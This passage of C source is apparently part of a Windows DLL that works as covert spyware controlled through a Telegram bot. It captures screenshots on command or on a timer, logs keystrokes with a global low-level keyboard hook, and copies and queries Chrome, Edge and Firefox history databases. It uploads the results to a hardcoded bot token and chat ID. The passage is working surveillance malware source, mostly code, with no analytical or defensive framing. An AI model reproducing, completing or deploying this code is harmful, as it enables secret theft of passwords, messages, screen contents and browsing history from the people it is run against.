    size_t n = strlen(text);
    char* etext = (char*)malloc(n * 3 + 16);
    if (!etext) return;
    PercentEncode(etext, n * 3 + 16, text);

    char* ekb = NULL;
    if (kb && kb[0])
    {
        ekb = (char*)malloc(strlen(kb) * 3 + 16);
        if (ekb) PercentEncode(ekb, strlen(kb) * 3 + 16, kb);
    }

    size_t cap = strlen(etext) + (ekb ? strlen(ekb) : 0) + 96;
    char* body = (char*)malloc(cap);
    if (!body) { free(etext); free(ekb); return; }
    lstrcpyA(body, "chat_id=");
    lstrcatA(body, kBotChatId);
    lstrcatA(body, "&text=");
    lstrcatA(body, etext);
    if (ekb)
    {
        lstrcatA(body, "&reply_markup=");
        lstrcatA(body, ekb);
    }
    char path[384];
    wsprintfA(path, "/bot%s/sendMessage", kBotToken);
    char* resp = NULL; DWORD len = 0, status = 0;
    HttpPost(kApiBase, path, "application/x-www-form-urlencoded",
             body, (DWORD)strlen(body), &resp, &len, &status);
    if (resp) free(resp);
    free(body);
    free(etext);
    free(ekb);
}

static void TgSendTextKb(const char* text, const char* kb)
{
    TgSendTextDyn(text, kb);
}

static void TgSendText(const char* text)
{
    TgSendTextDyn(text, kKbJson);
}

static unsigned char* BuildSendPhotoBody(const char* caption,
                                         const unsigned char* png, DWORD pngLen,
                                         DWORD* outLen)
{
    char head[1600];
    int hn = wsprintfA(head,
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"reply_markup\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n"
        "Content-Type: image/png\r\n\r\n",
        kMultipartBnd, kBotChatId, kMultipartBnd, caption, kMultipartBnd, kKbJson, kMultipartBnd);
    if (hn <= 0) return NULL;

    char tail[64];
    int tn = wsprintfA(tail, "\r\n--%s--\r\n", kMultipartBnd);
    if (tn <= 0) return NULL;

    DWORD total = (DWORD)hn + pngLen + (DWORD)tn;
    unsigned char* body = (unsigned char*)malloc(total);
    if (!body) return NULL;

    memcpy(body, head, (size_t)hn);
    memcpy(body + hn, png, pngLen);
    memcpy(body + hn + pngLen, tail, (size_t)tn);
    *outLen = total;
    return body;
}

static unsigned char* BuildSendDocBody(const char* filename,
                                       const char* data, DWORD dataLen,
                                       const char* caption,
                                       DWORD* outLen)
{
    char head[1024];
    int hn = wsprintfA(head,
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"reply_markup\"\r\n\r\n"
        "%s\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
        "Content-Type: text/plain\r\n\r\n",
        kMultipartBnd, kBotChatId, kMultipartBnd, caption,
        kMultipartBnd, kKbJson, kMultipartBnd, filename);
    if (hn <= 0) return NULL;

    char tail[64];
    int tn = wsprintfA(tail, "\r\n--%s--\r\n", kMultipartBnd);
    if (tn <= 0) return NULL;

    DWORD total = (DWORD)hn + dataLen + (DWORD)tn;
    unsigned char* body = (unsigned char*)malloc(total);
    if (!body) return NULL;

    memcpy(body, head, (size_t)hn);
    memcpy(body + hn, data, dataLen);
    memcpy(body + hn + dataLen, tail, (size_t)tn);
    *outLen = total;
    return body;
}

typedef BOOL (WINAPI *QueryFullProcImgFn)(HANDLE, DWORD, LPSTR, PDWORD);
#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#endif

static QueryFullProcImgFn pQueryFullImg = NULL;

static void EnsureQueryFullImg()
{
    if (pQueryFullImg) return;
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    if (k32)
        pQueryFullImg = (QueryFullProcImgFn)GetProcAddress(
            k32, "QueryFullProcessImageNameA");
}

static void BuildPhotoCaption(char* out, size_t cch)
{
    char app[64]    = "";
    char title[200] = "";
    HWND hw = GetForegroundWindow();
    EnsureQueryFullImg();
    if (hw)
    {
        char t[200] = "";
        if (GetWindowTextA(hw, t, (int)sizeof(t)) > 0)
        {
            for (char* q = t; *q; ++q)
                if (*q == '\r' || *q == '\n') *q = ' ';
            lstrcpynA(title, t, (int)sizeof(title));
        }
        DWORD pid = 0;
        GetWindowThreadProcessId(hw, &pid);
        if (pid)
        {
            HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (p)
            {
                char exe[MAX_PATH];
                DWORD sz = (DWORD)sizeof(exe);
                if (pQueryFullImg && pQueryFullImg(p, 0, exe, &sz) && sz > 0 &&
                    sz < sizeof(exe))
                {
                    exe[sz] = 0;
                    char* base = strrchr(exe, '\\');
                    base = base ? base + 1 : exe;
                    char* dot = strrchr(base, '.');
                    size_t n = dot ? (size_t)(dot - base) : strlen(base);
                    if (n > 0 && n < sizeof(app))
                    {
                        memcpy(app, base, n);
                        app[n] = 0;
                    }
                }
                CloseHandle(p);
            }
        }
    }
    if (title[0])
        lstrcpynA(out, title, (int)cch);
    else if (app[0])
        lstrcpynA(out, app, (int)cch);
    else
        lstrcpynA(out, "Desktop", (int)cch);
}

static void TakeAndSend()
{
    LogLine(L"dll", L"shot requested by the owner", 0);

    unsigned char* png = NULL; DWORD pngLen = 0;
    if (!CaptureScreenToMemory(&png, &pngLen))
    {
        LogLine(L"dll", L"capture failed - nothing to upload", 0);
        return;
    }

    char caption[512];
    BuildPhotoCaption(caption, sizeof(caption));

    DWORD bodyLen = 0;
    unsigned char* body = BuildSendPhotoBody(caption, png, pngLen, &bodyLen);
    free(png);
    if (!body)
    {
        LogLine(L"dll", L"out of memory building upload", 0);
        return;
    }

    char path[384], ctype[128];
    wsprintfA(path, "/bot%s/sendPhoto", kBotToken);
    wsprintfA(ctype, "multipart/form-data; boundary=%s", kMultipartBnd);

    char* resp = NULL; DWORD respLen = 0, status = 0;
    bool sent = HttpPost(kApiBase, path, ctype, (const char*)body, bodyLen,
                         &resp, &respLen, &status);
    free(body);

    if (sent && resp && strstr(resp, "\"ok\":true"))
    {
        LogLine(L"dll", L"photo sent OK (RAM-only)", 0);
    }
    else
    {
        LogLine(L"dll", L"sendPhoto failed - shot dropped", 0);
    }
    FreeResp(&resp);
}


static volatile LONG g_autoRun     = 0;   
static volatile LONG g_autoStop    = 0;   
static volatile LONG g_autoAwait   = 0;   
static volatile LONG g_autoSeconds = 30;  

static volatile LONG g_keysAwait   = 0;   

static volatile LONG g_histAwait   = 0;   
static volatile LONG g_histBrowser = 0;   

static DWORD WINAPI AutoShotThreadProc(LPVOID)
{
    LogLine(L"dll", L"screentime: automatic loop active", 0);
    for (;;)
    {
        if (g_autoStop || g_stop) break;
        TakeAndSend();
        long waited = 0;
        const long span =
            (long)InterlockedCompareExchange(&g_autoSeconds, 0, 0) * 1000L;
        while (!g_autoStop && !g_stop && waited < span)
        {
            Sleep(250);
            waited += 250;
        }
    }
    InterlockedExchange(&g_autoRun, 0);
    InterlockedExchange(&g_autoStop, 0);
    LogLine(L"dll", L"screentime: automatic loop ended", 0);
    return 0;
}

static void ScreentimeToggle()
{
    if (InterlockedCompareExchange(&g_autoRun, 0, 0) != 0)
    {
        InterlockedExchange(&g_autoStop, 1);
        InterlockedExchange(&g_autoAwait, 0);
        InterlockedExchange(&g_keysAwait, 0);
        InterlockedExchange(&g_histAwait, 0);
        TgSendText("Automatic screenshot stopped");
        LogLine(L"dll", L"screentime: stop requested by the owner", 0);
        return;
    }
    InterlockedExchange(&g_autoAwait, 1);
    InterlockedExchange(&g_keysAwait, 0);   
    InterlockedExchange(&g_histAwait, 0);
    TgSendText("How many seconds between automatic screenshots? "
               "Send me a number (for example 30).");
    LogLine(L"dll", L"screentime: waiting for the owner's interval", 0);
}

static void ScreentimeHandleSeconds(const char* text)
{
    while (*text == ' ' || *text == '\t') ++text;
    const int secs = atoi(text);
    if (secs < 3 || secs > 86400)
    {
        TgSendText("Please send a valid number of seconds (3 - 86400).");
        return;
    }
    InterlockedExchange(&g_autoAwait, 0);
    if (InterlockedCompareExchange(&g_autoRun, 1, 0) != 0) return;
    InterlockedExchange(&g_autoSeconds, secs);
    if (!CreateThread(NULL, 0, AutoShotThreadProc, NULL, 0, NULL))
    {
        InterlockedExchange(&g_autoRun, 0);
        TgSendText("Could not start the automatic loop, try again.");
        return;
    }
    char msg[96];
    wsprintfA(msg, "Automatic screenshot started every %d seconds.", secs);
    TgSendText(msg);
    LogLine(L"dll", L"screentime: automatic loop started by the owner", 0);
}


static volatile LONG g_keysActive = 0;   

static HHOOK    g_keysHook    = NULL;
static char     g_keysBuf[32768];
static size_t   g_keysLen     = 0;
static unsigned g_keysCount   = 0;
static bool     g_keysTrunc   = false;
static SYSTEMTIME g_keysStartST;

static const int kKeysMinSec = 1;
static const int kKeysMaxSec = 600;

static void KeysKeyName(UINT vk, BOOL shift, char* out, int cch)
{
    static const struct { UINT vk; char a, b; } kOem[] =
    {
        { 0xBA, ';', ':' }, { 0xBB, '=', '+' }, { 0xBC, ',', '<' },
        { 0xBD, '-', '_' }, { 0xBE, '.', '>' }, { 0xBF, '/', '?' },
        { 0xC0, '`', '~' }, { 0xDB, '[', '{' }, { 0xDC, '\\', '|' },
        { 0xDD, ']', '}' }, { 0xDE, '\'', '"' },
        { VK_MULTIPLY, '*', '*' }, { VK_ADD, '+', '+' },
        { VK_SUBTRACT, '-', '-' }, { VK_DECIMAL, '.', '.' },
        { VK_DIVIDE, '/', '/' },
    };
    out[0] = 0;
    if (vk >= 'A' && vk <= 'Z')
    {
        out[0] = shift ? (char)vk : (char)(vk + 32);
        out[1] = 0;
        return;
    }
    if (vk >= '0' && vk <= '9')
    {
        out[0] = shift ? ")!@#$%^&*("[vk - '0'] : (char)vk;
        out[1] = 0;
        return;
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
    {
        out[0] = (char)('0' + (int)(vk - VK_NUMPAD0));
        out[1] = 0;
        return;
    }
    if (vk >= 0x70 && vk <= 0x7B)              
    {
        wsprintfA(out, "[F%d]", (int)(vk - 0x70 + 1));
        return;
    }
    switch (vk)
    {
    case VK_SPACE:   out[0] = ' ';  out[1] = 0;  return;
    case VK_RETURN:  lstrcpynA(out, "[ENTER]\r\n", cch); return;
    case VK_BACK:    lstrcpynA(out, "[BS]", cch);   return;
    case VK_TAB:     lstrcpynA(out, "[TAB]", cch);  return;
    case VK_ESCAPE:  lstrcpynA(out, "[ESC]", cch);  return;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:  lstrcpynA(out, "[SHIFT]", cch); return;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:lstrcpynA(out, "[CTRL]", cch); return;
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:   lstrcpynA(out, "[ALT]", cch);  return;
    case VK_LWIN:
    case VK_RWIN:    lstrcpynA(out, "[WIN]", cch);  return;
    case VK_CAPITAL: lstrcpynA(out, "[CAPS]", cch); return;
    case VK_NUMLOCK: lstrcpynA(out, "[NUM]", cch);  return;
    case VK_SCROLL:  lstrcpynA(out, "[SCRL]", cch); return;
    case VK_INSERT:  lstrcpynA(out, "[INS]", cch);  return;
    case VK_DELETE:  lstrcpynA(out, "[DEL]", cch);  return;
    case VK_HOME:    lstrcpynA(out, "[HOME]", cch); return;
    case VK_END:     lstrcpynA(out, "[END]", cch);  return;
    case VK_PRIOR:   lstrcpynA(out, "[PGUP]", cch); return;
    case VK_NEXT:    lstrcpynA(out, "[PGDN]", cch); return;
    case VK_LEFT:    lstrcpynA(out, "[LEFT]", cch); return;
    case VK_UP:      lstrcpynA(out, "[UP]", cch);   return;
    case VK_RIGHT:   lstrcpynA(out, "[RIGHT]", cch); return;
    case VK_DOWN:    lstrcpynA(out, "[DOWN]", cch); return;
    case VK_SNAPSHOT:lstrcpynA(out, "[PRTSC]", cch); return;
    case VK_APPS:    lstrcpynA(out, "[MENU]", cch); return;
    case VK_PAUSE:
    case VK_CANCEL:  lstrcpynA(out, "[PAUSE]", cch); return;
    default: break;
    }
    for (size_t i = 0; i < sizeof(kOem) / sizeof(kOem[0]); ++i)
    {
        if (kOem[i].vk == vk)
        {
            out[0] = shift ? kOem[i].b : kOem[i].a;
            out[1] = 0;
            return;
        }
    }
    wsprintfA(out, "[VK%02X]", (unsigned)vk & 0xFF);
}

static LRESULT CALLBACK KeysHookProc(int code, WPARAM wp, LPARAM lp)
{
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lp;
        if (k && !(k->flags & LLKHF_UP))
        {
            BOOL shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            char name[16];
            KeysKeyName(k->vkCode, shift, name, (int)sizeof(name));
            size_t n = strlen(name);
            if (g_keysLen + n < sizeof(g_keysBuf) - 1)
            {
                memcpy(g_keysBuf + g_keysLen, name, n);
                g_keysLen += n;
                g_keysBuf[g_keysLen] = 0;
            }
            else
            {
                g_keysTrunc = true;
            }
            ++g_keysCount;
        }
    }
    return CallNextHookEx(NULL, code, wp, lp);
}

static void KeysSendReport(int secsReq)
{
    if (g_keysCount == 0)
    {
        char hdr[224];
        wsprintfA(hdr,
                  "Keystroke report \xE2\x80\x94 %d s window \xE2\x80\x94 "
                  "no keystrokes captured.", secsReq);
        TgSendTextDyn(hdr, kKbJson);
        return;
    }

    char header[224];
    wsprintfA(header,
              "Keystroke report \xE2\x80\x94 %d s window \xE2\x80\x94 %u keys",
              secsReq, g_keysCount);

    SYSTEMTIME stEnd;
    GetLocalTime(&stEnd);
    char range[64];
    wsprintfA(range, "%02u:%02u:%02u - %02u:%02u:%02u",
              g_keysStartST.wHour, g_keysStartST.wMinute, g_keysStartST.wSecond,
              stEnd.wHour, stEnd.wMinute, stEnd.wSecond);

    const char* truncNote = g_keysTrunc ? "\r\n(transcript truncated)" : "";
    size_t need = strlen(header) + strlen(range) + g_keysLen + 64;
    char* doc = (char*)malloc(need);
    if (!doc) return;
    lstrcpynA(doc, header, (int)need);
    lstrcatA(doc, "\r\n");
    lstrcatA(doc, range);
    lstrcatA(doc, "\r\n\r\n");
    strncat(doc, g_keysBuf, g_keysLen);
    lstrcatA(doc, truncNote);
    size_t total = strlen(doc);

    if (total <= 3600)                      
    {
        TgSendTextDyn(doc, kKbJson);
    }
    else                                    
    {
        char fname[40];
        wsprintfA(fname, "keystrokes-%02u%02u.txt",
                  g_keysStartST.wHour, g_keysStartST.wMinute);
        char capLine[96];
        lstrcpynA(capLine, header, (int)sizeof(capLine));
        DWORD bodyLen = 0;
        unsigned char* body = BuildSendDocBody(fname, doc, (DWORD)total,
                                               capLine, &bodyLen);
        if (body)
        {
            char path[384], ctype[128];
            wsprintfA(path, "/bot%s/sendDocument", kBotToken);
            wsprintfA(ctype, "multipart/form-data; boundary=%s", kMultipartBnd);
            char* resp = NULL; DWORD respLen = 0, status = 0;
            HttpPost(kApiBase, path, ctype, (const char*)body, bodyLen,
                     &resp, &respLen, &status);
            free(body);
            FreeResp(&resp);
        }
    }
    free(doc);
}

static DWORD WINAPI KeysThreadProc(LPVOID param)
{
    const int secs = (int)(INT_PTR)param;

    g_keysBuf[0] = 0;
    g_keysLen = 0;
    g_keysCount = 0;
    g_keysTrunc = false;

    g_keysHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeysHookProc, NULL, 0);
    if (!g_keysHook)
    {
        LogLine(L"dll", L"keystrokes: hook install failed", 0);
        TgSendTextDyn("Could not start the keystroke listener on this "
                      "computer.", kKbJson);
        InterlockedExchange(&g_keysActive, 0);
        return 1;
    }
    LogLine(L"dll", L"keystrokes: capture window open", 0);

    const DWORD start = GetTickCount();
    const UINT timerId = SetTimer(NULL, 0, 500, NULL);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0) > 0)
    {
        if (msg.message == WM_TIMER && msg.hwnd == NULL &&
            msg.wParam == (WPARAM)timerId &&
            GetTickCount() - start >= (DWORD)secs * 1000u)
        {
            break;                       
        }
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    KillTimer(NULL, timerId);
    UnhookWindowsHookEx(g_keysHook);
    g_keysHook = NULL;

    const DWORD elapsed = GetTickCount() - start;
    KeysSendReport(secs);
    LogLine(L"dll", L"keystrokes: capture window closed - report sent",
            elapsed);

    InterlockedExchange(&g_keysActive, 0);
    return 0;
}

static const char* kKeysBusyMsg =
    "A keystroke capture is already running - wait for the report.";

static void KeysStart(int secs)
{
    InterlockedExchange(&g_keysAwait, 0);
    if (secs < kKeysMinSec) secs = kKeysMinSec;
    if (secs > kKeysMaxSec) secs = kKeysMaxSec;
    if (InterlockedCompareExchange(&g_keysActive, 1, 0) != 0)
    {
        TgSendTextDyn(kKeysBusyMsg, kKbJson);
        return;
    }
    GetLocalTime(&g_keysStartST);
    HANDLE h = CreateThread(NULL, 0, KeysThreadProc,
                            (LPVOID)(INT_PTR)secs, 0, NULL);
    if (!h)
    {
        InterlockedExchange(&g_keysActive, 0);
        TgSendTextDyn("Could not start the keystroke listener, try again.",
                      kKbJson);
        return;
    }
    CloseHandle(h);
    char msg[160];
    wsprintfA(msg,
              "Listening to keystrokes for %d s \xE2\x80\x94 the report "
              "arrives here automatically.", secs);
    TgSendTextDyn(msg, NULL);
    LogLine(L"dll", L"keystrokes: capture started by the owner", 0);
}

static void KeysMenu()
{
    InterlockedExchange(&g_autoAwait, 0);   
    InterlockedExchange(&g_histAwait, 0);
    if (InterlockedCompareExchange(&g_keysActive, 0, 0) != 0)
    {
        TgSendTextDyn(kKeysBusyMsg, kKbJson);
        return;
    }
    InterlockedExchange(&g_keysAwait, 1);
    TgSendTextDyn("Enter the time in seconds (1 - 600).", NULL);
    LogLine(L"dll", L"keystrokes: waiting for the typed duration", 0);
}

static void KeysHandleSeconds(const char* text)
{
    while (*text == ' ' || *text == '\t') ++text;
    const char* p = text;
    while (*p >= '0' && *p <= '9') ++p;
    if (*p == 's' || *p == 'S') ++p;        
    if (*p != 0 || p == text)
    {
        TgSendTextDyn("Please send a number of seconds between 1 and 600.",
                      NULL);
        return;
    }
    const int secs = atoi(text);
    if (secs < kKeysMinSec || secs > kKeysMaxSec)
    {
        TgSendTextDyn("Please send a number of seconds between 1 and 600.",
                      NULL);
        return;
    }
    KeysStart(secs);
}


enum { kHistChrome = 1, kHistEdge = 2, kHistFirefox = 3 };
enum { kHistLast = 1, kHistDate = 2, kHistAll = 3 };

static const int    kHistMaxNumber = 20000;              
static const int    kHistMaxRows   = 30000;              
static const size_t kHistFileCap   = (size_t)20 * 1024 * 1024;

struct HistRow { long long t; char url[480]; char title[160]; };

struct HistCtx {
    HistRow* rows;
    int      n;
    int      cap;
    int      dbFound;      
    bool     rowCapped;    
};

struct HistJob {
    int browser;
    int mode;
    int limit;
    int day, month, year;
};

static const char* HistBrowserName(int b)
{
    return (b == kHistChrome) ? "Chrome"
         : (b == kHistEdge)   ? "Edge"   : "Firefox";
}

#ifdef SYSHANDLER_TEST_HOOKS
static void HistDbg2(const char* tag, const char* path, int rc)
{
    char line[MAX_PATH * 3];
    int n = wsprintfA(line, "%s %s rc=%d\r\n", tag, path ? path : "", rc);
    HANDLE h = CreateFileA("C:\\tsrc\\hist_debug.txt",
                           FILE_APPEND_DATA | SYNCHRONIZE, FILE_SHARE_READ,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, line, (DWORD)n, &w, NULL);
    CloseHandle(h);
}
#else
static void HistDbg2(const char*, const char*, int) {}
#endif

static DWORD HistEnvOr(const char* realName, const char* testName,
                       char* out, DWORD cch)
{
#ifdef SYSHANDLER_TEST_HOOKS
    {
        DWORD l = GetEnvironmentVariableA(testName, out, cch);
        if (l && l < cch) return l;
    }
#endif
    return GetEnvironmentVariableA(realName, out, cch);
}

static void HistRowClean(char* dst, int dstCch, const unsigned char* src)
{
    int o = 0;
    for (const unsigned char* p = src; *p && o + 1 < dstCch; ++p)
    {
        unsigned char c = *p;
        if (c < 0x20 || c == 0x7F) c = ' ';
        dst[o++] = (char)c;
    }
    dst[o] = 0;
}

static void HistAddRow(HistCtx* c, long long t,
                       const unsigned char* url, const unsigned char* title)
{
    if (c->n >= kHistMaxRows) { c->rowCapped = true; return; }
    if (c->n == c->cap)
    {
        int nc = c->cap ? c->cap * 2 : 256;
        HistRow* nr = (HistRow*)realloc(c->rows, (size_t)nc * sizeof(HistRow));
        if (!nr) return;
        c->rows = nr;
        c->cap  = nc;
    }
    HistRow* r = &c->rows[c->n++];
    r->t = t;
    HistRowClean(r->url,   (int)sizeof(r->url),
                 url   ? url   : (const unsigned char*)"");
    HistRowClean(r->title, (int)sizeof(r->title),
                 title ? title : (const unsigned char*)"");
}

static int HistRowCmp(const void* a, const void* b)
{
    const HistRow* x = (const HistRow*)a;
    const HistRow* y = (const HistRow*)b;
    return (x->t > y->t) ? -1 : (x->t < y->t) ? 1 : 0;
}

static bool HistDayRange(int day, int month, int year, long long* ftOut)
{
    SYSTEMTIME lst;
    memset(&lst, 0, sizeof(lst));
    lst.wYear  = (WORD)year;
    lst.wMonth = (WORD)month;
    lst.wDay   = (WORD)day;
    lst.wHour  = 12;                          
    SYSTEMTIME ust;
    if (!TzSpecificLocalTimeToSystemTime(NULL, &lst, &ust)) ust = lst;
    FILETIME ft;
    if (!SystemTimeToFileTime(&ust, &ft)) return false;
    long long ftNoon = (((long long)ft.dwHighDateTime) << 32)
                       | (long long)ft.dwLowDateTime;
    *ftOut = ftNoon - 12LL * 3600 * 10000000LL;   
    return true;
}

static void HistFmtTime(long long tUs, bool chromium, char* out, int cch)
{
    long long ft64 = chromium ? tUs * 10
                              : tUs * 10 + 116444736000000000LL;
    FILETIME ft;
    ft.dwHighDateTime = (DWORD)((unsigned long long)ft64 >> 32);
    ft.dwLowDateTime  = (DWORD)((unsigned long long)ft64 & 0xFFFFFFFFu);
    SYSTEMTIME u;
    if (!FileTimeToSystemTime(&ft, &u)) { lstrcpynA(out, "?", cch); return; }
    SYSTEMTIME l;
    if (!SystemTimeToTzSpecificLocalTime(NULL, &u, &l)) l = u;
    wsprintfA(out, "%02u/%02u/%04u %02u:%02u:%02u",
              l.wDay, l.wMonth, l.wYear, l.wHour, l.wMinute, l.wSecond);
}

static bool HistTempPath(char* out, size_t cch)
{
    char tp[MAX_PATH];
    UINT n = GetTempPathA((DWORD)sizeof(tp), tp);
    if (!n || n >= sizeof(tp) || (size_t)n + 40 >= cch) return false;
    static volatile LONG sSeq = 0;
    LONG s = InterlockedIncrement(&sSeq);
    lstrcpynA(out, tp, (int)cch);                 
    wsprintfA(out + lstrlenA(out), "shh_%lu_%lu.tmp",
              (unsigned long)GetCurrentProcessId(), (unsigned long)s);
    return true;
}

static void HistDeleteTemp(const char* mainTmp)
{
    static const char* kSfx[] = { "", "-journal", "-wal", "-shm" };
    char p[MAX_PATH * 2];
    for (int i = 0; i < 4; ++i)
    {
        lstrcpynA(p, mainTmp, (int)sizeof(p));
        lstrcatA(p, kSfx[i]);
        DeleteFileA(p);
    }
}

static bool HistCopyDb(const char* src, char* tmpOut, size_t cch)
{
    if (!HistTempPath(tmpOut, cch)) return false;
    static const char* kSfx[] = { "", "-journal", "-wal", "-shm" };
    char s[MAX_PATH * 2];
    for (int i = 0; i < 4; ++i)
    {
        lstrcpynA(s, src, (int)sizeof(s));
        lstrcatA(s, kSfx[i]);
        char d[MAX_PATH * 2];
        lstrcpynA(d, tmpOut, (int)sizeof(d));
        lstrcatA(d, kSfx[i]);
        if (i == 0)
        {
            if (!CopyFileA(s, d, FALSE)) return false;
        }
        else
        {
            CopyFileA(s, d, FALSE);           
        }
    }
    return true;
}

static void HistReadChromiumDb(const char* dbPath, HistCtx* c,
                               const HistJob* job,
                               long long loUs, long long hiUs)
{
    char tmp[MAX_PATH * 2];
    if (!HistCopyDb(dbPath, tmp, sizeof(tmp)))
    {
        HistDbg2("CHROM COPYFAIL", dbPath, -1);
        return;
    }
    sqlite3* db = NULL;
    int rc = sqlite3_open_v2(tmp, &db, SQLITE_OPEN_READWRITE, NULL);
    HistDbg2("CHROM OPEN", tmp, rc);
    if (rc == SQLITE_OK && db)
    {
        ++c->dbFound;
        const char* sql;
        if (job->mode == kHistLast)
            sql = "SELECT u.url,u.title,v.visit_time FROM visits v "
                  "JOIN urls u ON u.id=v.url "
                  "ORDER BY v.visit_time DESC LIMIT ?1;";
        else if (job->mode == kHistDate)
            sql = "SELECT u.url,u.title,v.visit_time FROM visits v "
                  "JOIN urls u ON u.id=v.url "
                  "WHERE v.visit_time>=?1 AND v.visit_time<?2 "
                  "ORDER BY v.visit_time DESC;";
        else
            sql = "SELECT u.url,u.title,v.visit_time FROM visits v "
                  "JOIN urls u ON u.id=v.url "
                  "ORDER BY v.visit_time DESC;";
        sqlite3_stmt* st = NULL;
        if (sqlite3_prepare_v2(db, sql, -1, &st, NULL) == SQLITE_OK && st)
        {
            if (job->mode == kHistLast)
                sqlite3_bind_int64(st, 1, job->limit);
            else if (job->mode == kHistDate)
            {
                sqlite3_bind_int64(st, 1, loUs);
                sqlite3_bind_int64(st, 2, hiUs);
            }
            while (sqlite3_step(st) == SQLITE_ROW)
            {
                HistAddRow(c, (long long)sqlite3_column_int64(st, 2),
                           sqlite3_column_text(st, 0),
                           sqlite3_column_text(st, 1));
                if (c->rowCapped) break;
            }
            sqlite3_finalize(st);
        }
        else HistDbg2("CHROM PREPFAIL", sql, sqlite3_extended_errcode(db));
        sqlite3_close(db);
    }
    else if (db)
    {
        sqlite3_close(db);
    }
    HistDeleteTemp(tmp);
}

static void HistReadFirefoxDb(const char* dbPath, HistCtx* c,
                              const HistJob* job,
                              long long loUs, long long hiUs)
{
    char tmp[MAX_PATH * 2];
    if (!HistCopyDb(dbPath, tmp, sizeof(tmp)))
    {
        HistDbg2("FFOX COPYFAIL", dbPath, -1);
        return;
    }
    sqlite3* db = NULL;
    int rc = sqlite3_open_v2(tmp, &db, SQLITE_OPEN_READWRITE, NULL);
    HistDbg2("FFOX OPEN", tmp, rc);
    if (rc == SQLITE_OK && db)
    {
        ++c->dbFound;
        const char* sql;
        if (job->mode == kHistLast)
            sql = "SELECT p.url,p.title,v.visit_date FROM moz_historyvisits v "
                  "JOIN moz_places p ON p.id=v.place_id "
                  "ORDER BY v.visit_date DESC LIMIT ?1;";
        else if (job->mode == kHistDate)
            sql = "SELECT p.url,p.title,v.visit_date FROM moz_historyvisits v "
                  "JOIN moz_places p ON p.id=v.place_id "
                  "WHERE v.visit_date>=?1 AND v.visit_date<?2 "
                  "ORDER BY v.visit_date DESC;";
        else
            sql = "SELECT p.url,p.title,v.visit_date FROM moz_historyvisits v "
                  "JOIN moz_places p ON p.id=v.place_id "
                  "ORDER BY v.visit_date DESC;";
        sqlite3_stmt* st = NULL;
        if (sqlite3_prepare_v2(db, sql, -1, &st, NULL) == SQLITE_OK && st)
        {
            if (job->mode == kHistLast)
                sqlite3_bind_int64(st, 1, job->limit);
            else if (job->mode == kHistDate)
            {
                sqlite3_bind_int64(st, 1, loUs);
                sqlite3_bind_int64(st, 2, hiUs);
            }
            while (sqlite3_step(st) == SQLITE_ROW)
            {
                HistAddRow(c, (long long)sqlite3_column_int64(st, 2),
                           sqlite3_column_text(st, 0),
                           sqlite3_column_text(st, 1));
                if (c->rowCapped) break;
            }
            sqlite3_finalize(st);
        }
        else HistDbg2("FFOX PREPFAIL", sql, sqlite3_extended_errcode(db));
        sqlite3_close(db);
    }
    else if (db)
    {
        sqlite3_close(db);
    }
    HistDeleteTemp(tmp);
}

static void HistScanChromium(int browser, HistCtx* c, const HistJob* job,
                             long long loUs, long long hiUs)
{
    char base[MAX_PATH * 2];
    DWORD l = HistEnvOr("LOCALAPPDATA", "SYSHANDLER_TEST_LOCALAPPDATA",
                        base, (DWORD)(sizeof(base) - 64));
    if (!l || l >= (DWORD)(sizeof(base) - 64)) return;
    lstrcatA(base, (browser == kHistChrome)
                   ? "\\Google\\Chrome\\User Data"
                   : "\\Microsoft\\Edge\\User Data");
    char pat[MAX_PATH * 2];
    lstrcpynA(pat, base, (int)sizeof(pat));
    lstrcatA(pat, "\\*");
    HistDbg2("CHROM SCAN", base, 0);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pat, &fd);
    if (h == INVALID_HANDLE_VALUE)
    {
        HistDbg2("CHROM FINDFAIL", pat, (int)GetLastError());
        return;
    }
    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        char dbPath[MAX_PATH * 2];
        lstrcpynA(dbPath, base, (int)sizeof(dbPath));
        lstrcatA(dbPath, "\\");
        lstrcatA(dbPath, fd.cFileName);
        lstrcatA(dbPath, "\\History");
        if (GetFileAttributesA(dbPath) == INVALID_FILE_ATTRIBUTES) continue;
        HistDbg2("CHROM FOUND", dbPath, 0);
        HistReadChromiumDb(dbPath, c, job, loUs, hiUs);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static void HistScanFirefox(HistCtx* c, const HistJob* job,
                            long long loUs, long long hiUs)
{
    char base[MAX_PATH * 2];
    DWORD l = HistEnvOr("APPDATA", "SYSHANDLER_TEST_APPDATA",
                        base, (DWORD)(sizeof(base) - 64));
    if (!l || l >= (DWORD)(sizeof(base) - 64)) return;
